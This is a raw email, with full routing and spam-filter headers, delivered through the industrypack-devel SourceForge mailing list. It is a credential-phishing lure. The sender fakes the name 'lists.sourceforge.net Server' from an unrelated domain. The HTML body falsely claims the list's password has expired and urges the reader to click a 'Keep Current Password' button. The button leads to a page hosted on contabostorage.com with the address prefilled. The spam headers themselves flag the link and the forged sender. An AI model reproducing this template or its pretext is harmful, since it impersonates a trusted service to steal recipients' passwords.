Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id OAcgAAuwm2mi4gMAu9opvQ
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	for <lists+industrypack-devel@lfdr.de>; Mon, 23 Feb 2026 02:40:27 +0100
X-Original-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 949711715A6
	for <lists+industrypack-devel@lfdr.de>; Mon, 23 Feb 2026 02:40:26 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=n7xqX4SqhRX8bCFxCvsro2AeG08P+H6P0mka88UWGY0=; b=gw24lV6bZAT3tV+ZjZtYI+/lBy
	xYs3VnoJmu0KJXi9yiToyGIpZwfmcVkvLFv2WY8A1aUJaX33+MzbHeKLbz2DHDjq398R/1oTNsLDC
	9pBeL8ugSlH5SW3kaVzDDmZ1vSljeYSX60avFE4pcnkVW0jmSjnQSLrb0A3/brWnay7Y=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vuKfk-00065T-OB
	for lists+industrypack-devel@lfdr.de;
	Mon, 23 Feb 2026 01:23:40 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <juliana.santos@campoegado.com.br>)
 id 1vuKfj-00065L-JM for industrypack-devel@lists.sourceforge.net;
 Mon, 23 Feb 2026 01:23:39 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=y2x4k4jgd7XvI57oIjbl0oWBrSkDuf3x9MuMemp8bZI=; b=IY9mfFIGan3tRrA4eGS48M3BtD
 0mvVm4iFWSyScORRbxUya7IiiCJxizop+ATb+148ty+ep54KExLLKQb9T6ibRre7pkkAT1k80KGZ5
 7w3Mu0r5IjiyYzb/UY7hvKuPuuJgOYsOvaHLEXQ9kLG1u5DQ57w68+b3m+Jq8StYYVk8=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=y2x4k4jgd7XvI57oIjbl0oWBrSkDuf3x9MuMemp8bZI=; b=e
 8dqBB4s3Qpvc04EiTXcHxGewyokJhmZeSQsjGfC2ghPDlO34tJW54vVwQXq6mCgpR0mhvTUgifdWK
 tIgbVKjYvXVZMXPkpJC8TbScMZNa5j9HT6cGiOd7V5jZSgM+uTtYIsRRYwPzPj/UaoAQahe4CE5ty
 PWW0LZp86jwx80HM=;
Received: from [78.189.19.2] (helo=mail.bildem.net)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vuKfi-0001bQ-Nl for industrypack-devel@lists.sourceforge.net;
 Mon, 23 Feb 2026 01:23:39 +0000
Received: from campoegado.com.br ([104.37.174.41]) by mail.bildem.net with
 MailEnable ESMTPA; Mon, 23 Feb 2026 02:50:19 +0300
From: ''lists.sourceforge.net Server'' <juliana.santos@campoegado.com.br>
To: industrypack-devel@lists.sourceforge.net
Date: 22 Feb 2026 15:50:18 -0800
Message-ID: <20260222155018.E1FD48D9B984F1EB@campoegado.com.br>
MIME-Version: 1.0
X-Spam-Score: 4.4 (++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Password Expired Server - Password Has Expired 
 Content analysis details:   (4.4 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE2           RBL: IP Subnet Listed in UCEPROTECT Level 2
 [78.189.19.2 listed in dnsbl-2.uceprotect.net]
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
X-Headers-End: 1vuKfi-0001bQ-Nl
Subject: [Industrypack-devel] Password Expiration; Take Action Now
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2615664803191085781=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [6.79 / 15.00];
	URIBL_BLACK(7.50)[contabostorage.com:url];
	RWL_MAILSPIKE_EXCELLENT(-0.40)[216.105.38.7:from];
	MAILLIST(-0.20)[mailman];
	R_DKIM_ALLOW(-0.20)[lists.sourceforge.net:s=beta];
	BAD_REP_POLICIES(0.10)[];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	DMARC_POLICY_SOFTFAIL(0.10)[campoegado.com.br : SPF not aligned (relaxed), DKIM not aligned (relaxed),none];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	RCPT_COUNT_ONE(0.00)[1];
	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x];
	RECEIVED_HELO_LOCALHOST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	ARC_NA(0.00)[];
	GREYLIST(0.00)[pass,body];
	DKIM_MIXED(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MIME_TRACE(0.00)[0:+,1:~,2:+,3:+];
	TO_DN_NONE(0.00)[];
	MID_RHS_MATCH_FROM(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[juliana.santos@campoegado.com.br,industrypack-devel-bounces@lists.sourceforge.net];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-];
	TAGGED_RCPT(0.00)[industrypack-devel];
	R_SPF_ALLOW(0.00)[+ip4:216.105.38.7];
	NEURAL_SPAM(0.00)[0.997];
	FORGED_SENDER_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
	DBL_BLOCKED_OPENRESOLVER(0.00)[lists.sourceforge.net:rdns,lists.sourceforge.net:helo,lists.sourceforge.net:dkim,contabostorage.com:url]
X-Rspamd-Queue-Id: 949711715A6
X-Rspamd-Action: add header
X-Spam: Yes

--===============2615664803191085781==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<HTML><HEAD><TITLE>Password Expired</TITLE>
<META charset=3DUTF-8>
<STYLE>
    body {
      font-family: Arial, sans-serif;
      background-color: #f1f4f8;
      color: #2c363a;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 600px;
      background: #fff;
      margin: 40px auto;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    h2 {
      color: #003188;
      text-align: center;
    }
    p {
      font-size: 14px;
      line-height: 1.6;
    }
    .button {
      display: block;
      width: fit-content;
      margin: 20px auto;
      padding: 10px 20px;
      background-color: #3d60fb;
      color: #fff;
      text-decoration: none;
      border-radius: 4px;
      font-weight: bold;
    }
  </STYLE>

<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<DIV class=3Dcontainer>
<H2>Server - Password Has Expired</H2>
<P>The password for your email <STRONG>industrypack-devel@lists.sourceforge=
=2Enet</STRONG> has expired.</P>
<P>Your account will be automatically logged out and a new password generat=
ed after 48 hours from <STRONG>2/22/2026 3:50:18 p.m.</STRONG>.</P>
<P>If you want to keep your current password, please click below:</P><A cla=
ss=3Dbutton href=3D"https://usc1.contabostorage.com/1f7ce7e3a9a4460fb9c744c=
08601df37:hpppemnbdhjkj1234/index.html?email=3Dindustrypack-devel@lists.sou=
rceforge.net" target=3D_blank>Keep Current Password</A> </DIV></BODY></HTML=
>


--===============2615664803191085781==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2615664803191085781==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2615664803191085781==--
